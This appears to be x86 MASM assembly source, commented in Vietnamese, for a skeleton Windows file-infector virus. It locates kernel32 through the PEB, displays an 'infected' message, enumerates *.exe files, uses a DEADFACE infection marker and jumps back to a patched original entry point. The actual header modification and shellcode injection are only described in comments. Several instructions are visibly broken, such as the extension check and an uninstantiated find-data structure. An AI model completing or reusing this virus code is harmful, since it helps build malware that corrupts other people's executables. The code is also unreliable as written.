.586
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
includelib kernel32.lib
include user32.inc
includelib user32.lib

.data
msgTitle    db "Infection Test", 0
msgText     db "You've been infected!", 0
wildcard    db "*.exe", 0
marker      db "DEADFACE", 0

.code
start:
    pushad

    ; 1. Lấy base Kernel32 từ PEB
    
    mov eax, fs:[30h]        ; PEB
    mov eax, [eax+0Ch]       ; PEB_LDR_DATA
    mov esi, [eax+1Ch]       ; InInitializationOrderModuleList
    lodsd                    ; Load 1 module
    mov eax, [eax+08h]       ; Base address kernel32.dll
    mov ebx, eax             ; EBX = kernel32 base

    ; 2. Get LoadLibraryA + GetProcAddress từ kernel32 (bỏ qua phần parse export để đơn giản hóa)
    ;    Ở đây assume ta dùng lại kernel32.lib để link trực tiếp. Nếu viết shellcode thực thụ thì phải parse Export Table.

    push offset msgTitle
    push offset msgText
    push 0
    call MessageBoxA


    ; 3. FindFirstFileA loop để tìm các file chưa lây
    lea eax, [wildcard]
    push offset wfd
    push eax
    call FindFirstFileA
    mov esi, eax            ; lưu handle

next_file:
    cmp esi, INVALID_HANDLE_VALUE
    je done_scan

    ; kiểm tra phần mở rộng ".exe"
    lea edi, wfd.cFileName
    mov ecx, dword ptr [edi+eax-4] ; kiểm tra 4 ký tự cuối là ".exe"
    cmp word ptr [edi+eax-4], 'e'
    jne skip_file

    ; 4. Mmap file, kiểm tra chưa lây nhiễm
    ; (giản lược: bạn cần viết thêm CreateFileA, ReadFile, kiểm tra dấu marker DEADFACE, rồi chỉnh header + inject shellcode.)

    ; Giả sử đã inject xong
skip_file:
    push offset wfd
    push esi
    call FindNextFileA
    test eax, eax
    jnz next_file

done_scan:
    call FindClose


    ; 5. Trở lại OEP
    mov eax, offset saved_OEP
    jmp eax

saved_OEP:
    dd 0    ; Sẽ được sửa bởi injector sau khi lây

    popad
    ret

; STRUCT Windows Find Data
wfd STRUCT
  dwFileAttributes      DWORD      ?
  ftCreationTime        FILETIME   <>
  ftLastAccessTime      FILETIME   <>
  ftLastWriteTime       FILETIME   <>
  nFileSizeHigh         DWORD      ?
  nFileSizeLow          DWORD      ?
  dwReserved0           DWORD      ?
  dwReserved1           DWORD      ?
  cFileName             BYTE       MAX_PATH dup (?)
  cAlternateFileName    BYTE       14 dup (?)
wfd ENDS

END start
